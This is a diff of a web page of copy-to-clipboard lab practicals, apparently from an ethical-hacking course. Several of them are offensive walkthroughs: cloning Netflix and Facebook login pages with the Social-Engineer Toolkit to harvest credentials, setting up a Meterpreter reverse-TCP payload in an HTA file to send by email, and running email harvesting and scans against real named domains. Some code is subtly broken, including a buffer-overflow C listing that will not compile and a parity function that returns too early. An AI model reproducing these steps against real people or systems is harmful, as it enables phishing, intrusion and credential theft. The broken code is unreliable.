@@ -37,542 +37,522 @@
 
 <body>
 
-    <button onclick="copyText(text1)"">Matrix Operation</button>
-  <button onclick=" copyText(text2)">Probability Distributions </button>
-    <button onclick="copyText(text3)">Measures of Central Tendency </button>
-    <button onclick="copyText(text4)">Data Cleaning and Manipulation</button>
-    <button onclick="copyText(text5)">Hypothesis Testing </button>
-    <button onclick="copyText(text6)">Machine Learning</button>
-    <button onclick="copyText(text7)">Correlation and Regression Analysis</button>
-    <button onclick="copyText(text8)">Univariate and Bivariate Data Analysis</button>
-    <button onclick="copyText(text9)">Data Storage Tools</button>
+    <button onclick="copyText(text1)">1D simple parity-check</button>
+    <button onclick=" copyText(text2)">2D Double Parity</button>
+    <button onclick="copyText(text3)">Remotely Accessing Kali Terminal using Putty</button>
+    <button onclick="copyText(text4)">Mac Address: Advance IP Scanner</button>
+    <button onclick="copyText(text5)">Netdiscover & CUPP</button>
+    <button onclick="copyText(text6)">Netcraft</button>
+    <button onclick="copyText(text7)">Implementing Scanning Too</button>
+    <button onclick="copyText(text8)">Credential harvester attack method</button>
+    <button onclick="copyText(text9)">Infoga</button>
+    <button onclick="copyText(text10)">Implement Steganography snow stool</button>
+    <button onclick="copyText(text11)">Implementing Hash Salting</button>
+    <button onclick="copyText(text12)">Buffer Overflow</button>
+    <button onclick="copyText(text13)">Format String Attacks </button>
+    <button onclick="copyText(text14)">Client-Side Attack Method</button>
+    <button onclick="copyText(text15)">Basic Command</button>
+
+
     <p id="copiedMsg"></p>
     <script>
-        var text1 = `import numpy as np
-from numpy.linalg import inv
-from numpy.linalg import det
+        var text1 = `
+        # Pract 1: 1D simple parity-check
 
-#creating Single dimensional array
-v1= np.array([1,2,3])
-v2= np.array([4,5,6])
-print("v1",v1)
-print("v2",v2)
-
-#addition of the matrices (i.e v1 & v2)
-r1= v1+v2
-print("Addition :",r1)
-
-#subtraction
-r1= v1-v2
-print("Subtraction :",r1)
-
-# Multiplication
-r1= np.dot(v1,v2)
-print("Multipliation :",r1)
-
-#Two Dimensional matrix(2x2)
-m1 = np.array([[1,2],[3,4]])
-print("m1 \n",m1)
-m2 = np.array([[5,6],[7,8]])
-print("\nm2 \n",m2)
-
-#Addition
-r2= m1+m2
-print("Addition :\n",r2)
-
-#Subtraction
-r2= m1-m2
-print("Subtraction :\n",r2)
-
-#Multiplication
-r2= np.dot(m1,m2)
-print("Multiplication:\n",r2)
-
-#Transpose
-T1=m1.transpose()
-print("Transpose:\n",T1)
-
-#Inverse
-iv= inv(m1)
-print("Inversion:\n",iv)
-
-#Determinant
-de= det(m1)
-print("Determinant: ",de)
+        # initialize a sequence
+        seq = [1,0,1,0,1,0]
+        
+        # sum of initialized sequence
+        sum_seq = sum(seq)
+        
+        # calculated parity bit ---> 1 (since the sum is odd)
+        pari_bit = 0 if sum_seq % 2 == 0 else 1
+        
+        # sequence with added parity bit ---> [1,0,1,0,1,0,1]
+        bin_pari = seq + [pari_bit]
+        
+        # print the original sequence ---> [1,0,1,0,1,0]
+        print("Original Sequence:",''.join(map(str,seq)))
+        print("Sequence with parity:",''.join(map(str,bin_pari)))
+        
+        # modify sequence at index 2
+        bin_pari[2] = 0    # shows data corrupted
+        
+        # retrive re-calculated parity bit ---> 1 (unchanged)
+        # calculate the last parity bit (element) of a list
+        rec_pari = bin_pari[-1]
+        
+        # retrive remaining data ---> [1,0,1,0,1,0] (unchanged)
+        rec_data = bin_pari[:-1]
+        
+        # calculate remaining sum of data --> rec_sum = 3
+        rec_sum = sum(rec_data)
+        
+        # check data intigrity
+        if rec_sum % 2 == rec_pari:
+            print("Data integrity matches/intact")
+        else:
+            print("Data Corrupted!")
     `;
-        var text2 = `import numpy as np
-import matplotlib.pyplot as plt
-
-# set a random seed number for reproduce
-a = np.random.seed(0)
-
-# generate random sample from a normal distribution
-mean= 0
-std_dev= 1
-num_sample =100
-normal_sample = np.random.normal(mean, std_dev, num_sample)
-
-# generate a random sample from a uniform distribution
-low=0
-high = 1
-uniform_sample = np.random.uniform(low, high, num_sample)
-
-# Create subplots with two columns
-fig, axes = plt.subplots(1, 2, figsize=(12, 5))
-# Histogram for Normal Distribution
-axes[0].hist(normal_sample, bins=20, color='red')
-axes[0].set_title("Normal Distribution")
-
-# Histogram for Uniform Distribution
-axes[1].hist(uniform_sample, bins=20, color='red')
-axes[1].set_title("Uniform Distribution")
-
-plt.show()`;
-        var text3 = `
-    import numpy as np
-import statistics as st
-import pandas as pd
-
-print("Calculate mean median using numpy, statistics libraries")
-da = [1,2,3,4,5]
-m1 = sum(da)/len(da)
-print("mean - ",m1)
-
-data = np.array ([1,2,3,4,5])
-m1= np.mean(data)
-print ("mean - ",m1)
-
-data = np.array ([1,2,3,4,5])
-m1= np.median(data)
-print ("median - ",m1)
-
-data = [1,2,3,4,5]
-m2 = st.mean(data)
-print("mean - ",m2)
-
-data = [1,2,3,4,5]
-m2 = st.median(data)
-print("median - ",m2)
-
-d= [1,2,2,3,3,3,4,4,4,4]
-m2= st.mode(d)
-print("mode - ",m2)
-
-"""#How to calculate mean median mode for dataset using python"""
-
-data = pd.read_csv("Employee.csv")
-print("file read successffully")
-print("\nHead")
-print(data.head)
-print("\nDescribe")
-print(data.describe())
-print("\n mean, median, mode for each column")
-print(data.mean())
-print(data.median())
-print(data.mode())
-
-"""#How to calculate dispersion measure for data using python"""
-
-print("calculate dispersion measure for data using python")
-import numpy as np
-
-#sample data
-data1 = np.array([10,12,15,18,20])
-data2 = np.array([5,8,9,12,14])
-#df.[colunm name]#csv file
-#data(["column name"])
-range_data1 = np.ptp(data1) # predefined function which gives range(highest and lowest)
-range_data2 = np.ptp(data2) # predefined function which gives range(highest and lowest)
-print("Range")
-print(range_data1)
-print(range_data2)
-print("---------------------")
-print("Standard deviation")
-std1 = np.std(data1)
-std2 = np.std(data2)
-print(std1)
-print(std2)
-print("---------------------")
-print("variance")
-var1= np.var(data1)
-var2= np.var(data2)
-print(var1)
-print(var2)
-print("---------------------")
-print("Co-varience")
-c1= np.cov(data1 , data2) [0,1]
-print(c1)
-c2= np.cov(data1 , data1) [0,1]
-print(c2)
-print("---------------------")
-print("Co-varience matrix")
-d5= np.array([data1, data2])
-d6= np.cov(d5)
-print(d6)
-
-"""#How to calculate dispersion measure for dataset using python"""
-
-# variance, standard deviation
-data= pd.read_csv("Employee.csv");
-#calculate the variance
-print("\nvariance")
-print(data.var()) #for variance
-print("\nstandard deviation")
-print(data.std()) #standard deviation`;
-        var text4 = `
-    import pandas as pd
-import numpy as np
-from scipy import stats
-from scipy.stats import zscore
-import warnings
-# Filter out future warnings
-warnings.filterwarnings("ignore", category=FutureWarning)
-
-# Create a DataFrame from the dictionary
-df = pd.read_csv("/content/WIPRO.NS.csv")
-df.head(5)
-
-#finding the shape of the dataframe and number of null values in it
-og_shape = df.shape
-print("shape = ",og_shape)
-df.isnull().sum()
-
-# Replace null values with the mean of each column
-m = df.mean()
-print("Mean\n",m)
-df.fillna(m, inplace=True)
-df.isnull().sum()
-
-# Identify and remove outliers using Z-score
-z_scores = zscore(df[['Open', 'High', 'Low', 'Close', 'Adj Close', 'Volume']])
-df_no_outliers = df[(z_scores < 3).all(axis=1)]
-
-# Display the modified number of rows
-removed_rows = og_shape[0] - df_no_outliers.shape[0]
-print(og_shape)
-print(df_no_outliers.shape)
-print("number of rows removed: ",removed_rows)`;
-        var text5 = `
-    from scipy.stats  import ttest_1samp
-import numpy as np
-
-age = [45,89,23,46,12,69,45,24,34,67]
-print ("age",age)
-m1 = np.mean(age) #calculating mean
-print("Mean of age",m1)
-
-T_test ,P_value = ttest_1samp(age,30) #finding Ttest & pvalue
-print(P_value)
-
-if P_value < 0.05:
-  print("we reject the hypothesis")
-else:
-  print("we accept the hypothesis")
-
-
-"""Hypothesis Testing Two data set"""
-
-from scipy.stats  import ttest_ind
-import numpy as np
-
-subjectA = [10,14,15,18,16,15,17,18,10,19]
-subjectB = [17,14,15,18,16,14,13,11,17,19]
-
-t_test , p_value = ttest_ind(subjectA,subjectB)
-print(p_value)
-
-alpha = 0.05
-if p_value < alpha:
-  print("there is a signaficant difference between them accept ")
-else:
-  print("there is no signaficant difference between them reject")`;
-        var text6 = `
-    import pandas as pd
-from sklearn.model_selection import train_test_split
-from sklearn.linear_model import LogisticRegression
-from sklearn.metrics import accuracy_score
-import warnings
-
-data = pd.read_csv("/content/Iris.csv")
-data.head(5)
-
-#split the data
-X = data[['SepalLengthCm','SepalWidthCm','PetalLengthCm','PetalWidthCm']]
-Y = data[['Species']]
-X_Train,X_Test,Y_Train,Y_Test = train_test_split(X,Y,test_size = 0.3)
-
-#fitting the training data into the model
-model = LogisticRegression()
-model.fit(X_Train,Y_Train)
-
-#predicting finding the accuracy of the prediction
-pred = model.predict(X_Test)
-accuracy = accuracy_score(Y_Test,pred)
-print(accuracy)`;
-        var text7 = `
-    import pandas as pd
-import numpy as np
-from scipy import stats
-
-df = pd.read_csv("/content/sample.csv")
-#select the variable
-x = df['TCS']
-y = df['Wipro']
-df.head(5)
-
-#calculate the Correlation coefficient
-c = stats.pearsonr(x,y)[0]
-print(c)
-
-#printing the strength of the correlation
-if (c > 0.7):
-  print('strong positive correlation')
-elif(c > 0.4):
-  print("moderate correlation")
-elif(c > 0):
-  print("weak positive correlation")
-elif(c < 0 and c >= -0.4):
-  print("moderate negative")
-elif (c > -0.7):
-  print('strong negative correlation')
-
-#simple linear regression
-m = stats.linregress(x,y)
-print("Slope: {:.2f}".format(m.slope))
-print("Intercept: {:.2f}".format(m.intercept))
-print("R-value (Correlation Coefficient): {:.2f}".format(m.rvalue))
-
-#extract linear regression coefficient
-s = m.slope
-print(s)
-i = m.intercept
-print(i)
-
-pred_y = s * x + i
-r_squared = m.rvalue
-print(r_squared)
-
-"""# *Group 2*"""
-
-# for same sector companies
-from scipy.stats import stats
-from scipy import stats as st
-import pandas as pd
-import warnings
-# Suppress warnings
-warnings.filterwarnings("ignore")
-com1= pd.read_csv("INFY.NS.csv")
-com2= pd.read_csv("TCS.NS.csv")
-# -----------------------correlation--------------------------
-c = st.pearsonr(com1['Close'],com2['Close'])[0]
-print(c)
-if (c > 0.7):
-print('strong positive correlation')
-elif(c > 0.4):
-print("moderate correlation")
-elif(c > 0):
-print("weak positive correlation")
-elif(c < 0 and c >= -0.4):
-print("moderate negative")
-elif (c > -0.7):
-print('strong negative correlation')
-#---------------------------------simple linear regression------------------------------
-m = stats.linregress(com1['Close'],com2['Close'])
-print("simple linear regression",m)
-#-------------------------------extract linear regression coefficient--------------------------------------------------
-s = m.slope
-print("slope",s)
-i = m.intercept
-print("extract linear regression coefficient",i)
-pred_y = s*com1['Close']+i
-r_squared = m.rvalue
-print("rsquare",r_squared)
-# for different sector companies
-import pandas as pd
-from scipy.stats import stats
-Com1=pd.read_csv("MANKIND.NS.csv")
-Com2=pd.read_csv("INFY.NS.csv")
-t_test,p_value=stats.ttest_ind(Com1['Close'],Com2['Close'])
-print(p_value)
-if p_value < 0.05:
-print("fits in portfolio")
-else:
-print("does not fit in portfolio")
-# -----------------------corelation--------------------------
-c = st.pearsonr(com1['Close'],com2['Close'])[0]
-print(c)
-if (c > 0.7):
-print('strong positive correlation')
-elif(c > 0.4):
-print("moderate correlation")
-elif(c > 0):
-print("weak positive correlation")
-elif(c < 0 and c >= -0.4):
-print("moderate negative")
-elif (c > -0.7):
-print('strong negative correlation')
-#---------------------------------simple linear regression------------------------------
-m = stats.linregress(com1['Close'],com2['Close'])
-print("simple linear regression",m)
-#-------------------------------extract linear regression coefficient--------------------------------------------------
-s = m.slope
-print("slope",s)
-i = m.intercept
-print("extract linear regression coefficient",i)
-pred_y = s*com1['Close']+i
-r_squared = m.rvalue
-print("rsquare",r_squared)
+        var text2 = `
+        # Practical-2: 2D Double Parity
+        def add_par(data):
+            for row in data:
+                row.append(row.count(1)%2)
+        
+                column_parity=[sum(column)%2 for column in zip(*data)]
+                data.append(column_parity)
+                return data
+        
+        def check_parity(data):
+            row_parity = [row[-1] for row in data[:-1]]
+            calculated_row_par = [row.count(1)%2 for row in data[:-1]]
+            
+            column_parity = [data[-1]]
+            calculated_column_par = [column.count(1)%2 for column in data[:-1]]
+        
+            row_error = [i for i,(actual, calculated) in enumerate
+                     (zip (row_parity, calculated_row_par)) if actual != calculated]
+        
+            column_error = [i for i,(actual, calculated) in enumerate
+                     (zip (column_parity, calculated_column_par)) if actual != calculated]
+            return row_error,column_error
+        
+        data = [[1,0,1,0,1],[0,1,0,1,0]]
+        data_par = add_par(data)
+        
+        print("DATA WITH PARITY BITS:")
+        
+        for row in data_par:
+            print(row)
+        
+        data_par[1][1] = 0
+        row_error,column_error = check_parity(data_par)
+        
+        print("\n DETECTED ERROR!:")
+        print("ROW ERROR:",row_error)
+        print("COLUMN ERROR:",column_error)
 `;
+
+        var text3 = `
+        #Ip address: Putty
+        #Remotely Accessing Kali Terminal using Putty
+        
+        #check ip address should be same
+        ifconfig  --rootkali
+        ipconfig  --cmdpromt
+        
+        #create a folder to access remotely (root kali)
+        cd /home
+        mkdir /testfile
+        cd testfile/
+        
+        #Now we'll create a text file in the folder that we've created. Once created we can insert any text in that file.
+        cat > xyz.txt
+        Heyy Teddy!
+        
+        #Now we'll be checking the upgradable packages and upgrading necessary dependencies
+        apt update
+        
+        #We will install the Open SSh server in our kali to get capability to remotely access the terminal
+        apt install openssh-server
+        
+        #Install ufw for security creating rules for network and check the status where it'll show us the availability of the firewall and the rules applied.
+        apt install ufw
+        ufw status
+        ufw enable
+        
+        #Let's add rule on our firewall by using “ufw allow 22/tcp”. The port (22) is used for Secure Shell (SSH) communication and allows remote administration access to the VM
+        ufw allow 22/tcp
+        
+        #Now we'll start the server so that we can remotely access the terminal and check the status if the server is up and running
+        service ssh start
+        service ssh status
+        
+        #Now we'll start putty and provide IP address of our kali machine and the port i.e 22 ,connection type will SSH and select telnet.
+        
+        #After it is connected, we'll be prompted to enter the kali credentials to access the terminal
+        login as : kali
+        password(email)password:
+        
+        #After Logging in We can access the terminal and access the file which we have created
+        cd /home
+        ls
+        cd testfile/
+        ls
+        cat xyz.text
+        (Message will be visibe as Heyy Teddy!)
+`;
+
+        var text4 = `
+        #Mac Address: Advance IP Scanner
+        #Using the tools for scanning network and determining IP and MAC
+        
+        #Open Advanced IP Scanner
+        #Write the IP address range and press enter
+        (eg..192.168.0.0 - 192.168.0.254)
+        #Sow all the host connected in that IP network range
+`;
+
+        var text5 = `
+        #Netdiscover & CUPP
+
+        #The netdiscover is a tool which is used to gather all the important information about the network. It gathers information about the connected clients and the router.
+        netdiscover -r(eg-192.168.0.103)
+        
+        #CUPP
+        #Create a folder where you want to clone the cupp repository.
+        #Note: Make Sure You have Python Installed on your System, as this is a python-based tool.
+        cd /home
+        mkdir CUPP  --cd {folder_name}
+        cd CUPP   --mkdir {folder_Name}
+        git clone https://github.com/Mebus/cupp.git
+        
+        #After cloning we can start working with cupp and we have a few options to explore cupp to find what those options are we'll be using python3 cupp.py -h
+        
+        #Now we'll Start the cupp and Enter Required data for it to find the possible password.
+        We'll be using “python3 cupp.py -i” to interact with cupp.
+        python3 cupp.py -i
+        
+        #Leet mode: Leet (or "1337") is a system of modified spellings used primarily on the Internet. 
+        #Hyperspeed print: Hyperspeed print means CUPP will print the generated dictionary on the console.
+        
+        #Let's check the file that's been created by cupp.
+        ls
+        apt install leafpad
+        leafpad (eg-name.txt)
+        `;
+
+        var text6 = `
+        #Netcraft
+
+        #Netcraft's automated detection operates around the clock to identify malicious websites as well as fraudulent domains, social media profiles, email campaigns and more.
+        
+        #Enter the site url to get the report on that site.
+        eg--https://kccollege.edu.in/
+        `;
+
+        var text7 = `
+        #Implementing Scanning Tool
+        #scan a website/ip addess to find vulnerabilities.
+        
+        #Zenmap
+        
+        #Enter the URL/Ip in Target, “nmap -T4 -A -v” is an Nmap command for intense scan after entering these two clicks scan.
+        Enter--Target: eg-www.google.com
+        click on - scan
+        
+        #click on
+        Ports/Host
+        
+        #click on
+        Topology
+        
+        #click on
+        Host details
+        `;
+
         var text8 = `
-    import numpy as np
-import matplotlib.pyplot as plt
-from statistics import mean,median,mode
+        #Implement Information/Email Harvesting
+        #Harvesting Credentials with SEToolkit using Credential harvester attack method. 
+        
+        #THE SOCIAL-ENGINEER TOOLKIT (SET)
+        
+        #rootkali
+        setoolkit
+        
+        #Enter 1 select 
+        “Social-Engineering Attacks”.
+        
+        #Enter 2 select 
+        “Website Attack Vectors”.
+        
+        #Enter 3 select 
+        “Credential Harvester Attack Method”.
+        
+        #Enter 2 select 
+        “Site Cloner”.
+        
+        #Click Enter When prompt is shown.
+        
+        #Enter The Site Url to clone
+        eg--https://www.netflix.com/in/Login
+        
+        #Site Cloning complete prompt.
+        
+        #Enter the Ip Address in the browser then enter the credentials.
+        
+        #There should be log created in root terminal.
+        
+        #Hit Ctrl + C to End hosting and create a report in /root/.set/reports/{log time}.xml
+        
+        #Open Folder
+        #Open File Explorer and look for root folder. ---enter password
+        
+        #Locate the report file in /root/.set/reports/ (If you can't find .set folder search it in the search bar above) Then select the file and Open with Vim.
+        (you will find credentials emailid and pass)
+        `;
 
-#creating a dataset
-examScore = [35,28,32,45,22,18,42,36,26,50] #5th 20-> 22 2nd 28 ->18
+        var text9 = `
+    #Infoga
+#Capture Emails available in a website using Infoga.
 
-#calculate mean median mode
-avg1 = mean(examScore)
-med = median(examScore)
-Mode = mode(examScore)
-print(avg1)
-print(med)
-print(Mode)
+#Clone the repository using 
+“git clone https://github.com/m4ll0k/Infoga.git” in terminal.(rootkali)
 
-#create a histogram to visualise marks
-plt.hist(examScore,bins = 10,edgecolor = 'k',alpha = 0.6)
-plt.xlabel("Exam Score")
-plt.ylabel("Frequency")
-plt.title("Histogram of Exam Score")
-plt.show()
+cd Infoga
+ls
 
-#working with Bi-Variant
-import pandas as pd
-#create a bi-variant data set
-data = pd.DataFrame({"Height":[165,165,70,180,185],"Weight":[60,65,70,75,65]})
-#print the data set
-data.info()
-data.shape
-data.head()
-data.describe()
+#Change directory to Infoga folder and install infoga using 
+“python setup.py install” 
 
-#create Scatter plot
-plt.scatter(data["Height"],data["Weight"])
-#add label to the axis
-plt.xlabel("Height")
-plt.ylabel("Weight")
-plt.title("Scatter Plot of Height And Weight")
-plt.show()
+#Now run infoga with victim site url and source(search engine)
+“python infoga.py -domain {URL} -source {search engine} -verbose 3” 
 
-#Working with iris data set using univariant
-import pandas as pd
-import matplotlib.pyplot as plt
-import seaborn as sns
-#load the Data set
-df = pd.read_csv("/content/Iris.csv")
-print(df)
-df.describe()
+eg--python infoga.py -domain https://kccollege.edu.in/ -source google -verbose 3
 
-#display uni variant data using histogram
-sns.set(style="whitegrid")
-plt.figure(figsize=(12,6))
-#sepal length
-plt.subplot(1,2,1)
-sns.histplot(df['SepalLengthCm'],color = "darkorange")
-plt.title("Sepal Length")
-# sapel width
-plt.subplot(2,2,2)
-sns.histplot(df["SepalWidthCm"],color='darkorange')
-plt.title("sapel width")
-# petal length
-plt.subplot(2,2,3)
-sns.histplot(df["PetalLengthCm"],color='darkorange')
-plt.title("petal length")
-plt.show()
-
-#using histogram to display univariate for categorial Variable
-sns.histplot(x = 'SepalLengthCm',data = df,hue = df['Species'])
-
-#vertical Histogram
-sns.histplot(df,y = "SepalLengthCm",color = 'magenta')
-
-sns.boxplot(df["SepalLengthCm"],color = 'green')
-plt.show
-df["SepalLengthCm"].describe()
-
-# count plot is used for distribution of categorial variable
-sns.countplot(df,x='Species')
-plt.show()
-
-sns.barplot(df, x="Species", y="SepalLengthCm")
-plt.show()`;
-    var text9 = `
-    Cassandra Storage Tool
-    START
-    
-    Java v1.8/8 - Java -version 
-    Python v2.7 - Python –version 
-    cassandra v3.11 - Cassandra -v 
-    
-    In a Command Prompt -> 'Cassandra -f' //to start the Cassandra
-
-    
-    In another Command Promt -> cqlsh -> Clck ENTER
-    CREATE KEYSPACE <YourDBName> WITH replication = {'class': 'SimpleStrategy','replication_factor':1} //To create Keyspace -> Clck ENTER
-    USE <YourDBName> -> Clck ENTER
-
-    CREATE TABLE student(
-    student_id int PRIMARY KEY, 
-    student_name text,  
-    student_phone varint );
-
-    //Insert 
-    //Enter Several Data using this Syntax
-    INSERT INTO <tablename> (<column1 name>, <column2 name>....)VALUES (<value1>, <value2>....) 
-
-    //SELECT
-    SELECT FROM <tablename> // All rows and columns
-    SELECT FROM <table name> WHERE <condition>; // only rows and columns that meet the condition e.g ... WHERE student_id = 2
-
-    //Update
-    UPDATE <tablename>SET <column1 name> = <new value>,<column2 name> = <value>....WHERE student_id = 2
-
-    //Delete
-    DELETE FROM <identifier> WHERE <condition>; 
-
-    END
-
-    Spark
-    START
-    JSON File
-    {"name":"", "age":, "Birthday Month": ""}
-    {"name":"", "age":, "Birthday Month": ""}
-    Command to start: spark-shell
-    
-    Commands:
-    val x = spark.read.json("Path/filename.json")
-
-x.show()
-
-x.filter($”age<21”).show()
-
-x.filter(col("Birthday Month").contains("October")).show()
-
-tempdataframe.createOrReplaceTempView("sample")
-
-spark.sql("select * from sample where age > 20").show()
-
-
-
-EXTRA 
-val a spark.read.options (Map("inferSchema"->"true", "header"->"true")).csv("C:/Users/Hp/Downloads/sql.csv")
-
-a.show()
-
-a.filter($"Rollno"<20).show()
-END
+#Note: If the source is not provided infoga will scour through some of the popular search engine.
+eg--python infoga.py -domain https://hsncu.edu.in/ -verbose 3
     `;
-        function copyText(text) {
+
+        var text10 = `
+    Implement Steganography
+Perform steganography using snow tool.
+
+#SNOW
+
+#Create a txt file add some information into the file and saved as “test.txt” and add it into the “SNOW FOLDER”.
+eg--hey
+    Hellooo
+    Holaaaaaa
+
+#Encode the message "abcdefg" using the "snow.exe" tool, with passphrase "xyz," into the carrier file "test.txt," and save the result in "hidden.txt."
+--in snow folder open cmd -- >SNOW.EXE -C -p 1234 -m "Twinkling Watermelon" test.txt hidden.txt
+
+#Open the snow folder and now you can see the hidden.txt file is generated.
+
+#The Whitespace has been added into the message
+open hidden.txt to see the whitespaces
+
+#Decode the hidden data using the following command.
+--in snow folder open cmd -- >SNOW.EXE -C -p 1234 hidden.txt
+
+
+
+
+#STOOL
+
+#Perform steganography using Stool
+#You can use BMP, GIF, and WAV file types to cover documents that hide secret data.
+
+#Drag & drop the bmp file and then drop the data that you want to hide onto the bmp file. 
+
+#Add the file you want to hide in the image. You will be prompted to Enter Passphrase and the encryption type in our case DES (Data Encryption Standard).
+
+#Now a copy of the bmp file will create which holds the hidden data. The data can be revealed with passphrase.
+
+#Right click on the image and a popup box will appear where you can reveal the data by entering the right “Paraphrase” and choosing the correct “Encryption Algorithm”.
+
+#The “Hidden Data” is revealed.
+`;
+
+        var text11 = `
+#Implementing Hash and Salt
+
+#Hash
+
+#Practical-8: Hash for password
+
+import hashlib
+
+def gen_hash(password):
+    pass_word=password.encode('utf-8') #utf (unicode transformation format, 8 stands for 8-bits)
+    hash_pass=hashlib.sha256(pass_word).hexdigest() #SHA 256 bit Algorithm- Secure Hash Algorithm
+    return hash_pass
+
+password="inevitable"
+hash_pass=gen_hash(password)
+print("HASHED PASSWORD FOR YOUR PASSWORD:",hash_pass)
+
+
+
+#SALT
+
+#Salt is a random value that is generated and combined with user's password before hashing to enhance the security of stored passwords.
+
+import hashlib
+import os
+
+def gen_salt():
+    return os.urandom(16) 
+
+def gen_hash(password,salt):
+    pass_word_salt=password.encode('utf-8')+salt #utf (unicode transformation format, 8 stands for 8-bits)
+    hash_pass=hashlib.sha256(pass_word_salt).hexdigest() #SHA 256 bit Algorithm- Secure Hash Algorithm
+    return hash_pass,salt
+
+password="inevitable"
+salt=gen_salt()
+hash_pass,salt=gen_hash(password,salt)
+print("HASHED PASSWORD FOR YOUR PASSWORD:",hash_pass)
+print("SALT VALUE:",salt)
+`;
+
+        var text12 = `
+#Buffer Overflow
+#Understanding Buffer Overflow and Format String Attack
+
+#Practical 9A - Buffer Overflow
+
+#Create a file to write code with the extension "c"
+nano buffer.c enter.
+
+
+CODE:
+
+#include<stdio.h>
+
+int test_pw()
+
+{
+
+char pin[10];
+
+int x = 15, 1;
+
+printf("Enter Password:"); scanf("%s", pin); for(i = 0; i < 10; i += 2) x = (x & pin[i]) | pin [i+1]; if (x > 48)
+
+return 0;
+
+else
+
+return 1;
+
+}
+
+#New prompt will open up “buffer.c” where we can write our code.
+#To redirect to “root terminal” press cntrl+x and yes(y) enter.
+
+#This command compiles the C source code file buffer.c using GCC. The resulting executable is named "buf" and includes debugging information (-g). Additionally, the --no-pie option is used, which means the resulting executable will not be a Position-Independent Executable
+
+gcc -g -no-pie -o buf buffer.c
+
+#Run the compiled file then Enter the password as it states fail which mean the password didn't meet the requirements.
+
+./buf
+(Shipra) --Fail
+
+#In this section we can see the password is successful as it meets the length of 10 which is our requirement.
+./buf
+(Shiprajana) --You Win
+
+#In this section we get segmentation fault as it overflows then the required buffer.
+./buf
+(Shiprajanabdhydgwefgnrnbifywurhsj)  --segmentation fault
+`;
+
+        var text13 = `
+#Format String Attacks 
+
+
+#Create a “string.c” file and write the code for Format String Attack example.
+nano string.c enter
+
+CODE
+
+#include<stdio.h>
+
+void main(int argc, char **argv)
+
+{
+
+printf(argv[1]);
+
+}
+
+#Compile the code and run the code.
+gcc -o test string.c
+
+#The program will interpret "%s" as a format specifier and try to print a string at the location pointed to by whatever value is on the stack at that moment.
+
+./test "%s %s"
+
+#Let's try this in Python. Create a python file “str.py” and write the following code to replicate Format String Attack. 
+
+nano str.py
+
+CODE
+
+import sys
+import subprocess
+
+a = "./test"
+
+b = sys.argv[1]
+
+subprocess.run([a,b])
+
+
+#As we can observe the output it points to the current position of the data in the stack.
+
+python str.py "Teddy"
+python str.py "%s"
+python str.py "%c %p"
+`;
+
+        var text14 = `
+#Client-Side Attack Method
+
+#Type 
+“setoolkit” and enter.
+
+#Select 1 
+“Social engineering Attacks”.
+
+#Select 2 
+“Website Attack Vectors”.
+
+#Select 7 
+“HTA Attack Method”.
+
+#Select 2 
+“Site Cloner”.
+
+#Enter The URL.
+https://www.facebook.com/Login/
+
+#After this it will ask you for an ip address (put your kali linux machine ip address) to Host the clone site on that ip address.
+
+#Enter Port Numbers to let Users Access the site e.g., 
+444,1235,443 (any 1)
+
+#Select Meterpreter Reverse TCP i.e., 
+payload number 3.
+
+#Enter 
+set payload windows/meterpreter/reverse_tcp
+set LHOST ---(ip address)
+set LPORT 1235
+set ExitOnSession false
+set EnableStageEncoding true
+exploit -j
+
+#Enter the IP address in your xbrowser. The .hta file will be downloaded automatically.
+
+#Login in into your “GMAIL” account .
+
+#Compose a new mail and add the “Launcher.hta” file.
+
+#After adding the file “Virus detected!”.
+`;
+
+        var text15 = `
+Whoami
+ifconfig
+(networking )
+`;
+
+function copyText(text) {
             navigator.clipboard.writeText(text).then(function () {
                 document.getElementById('copiedMsg').innerHTML = "Text Copied"
             }).catch(function (err) {
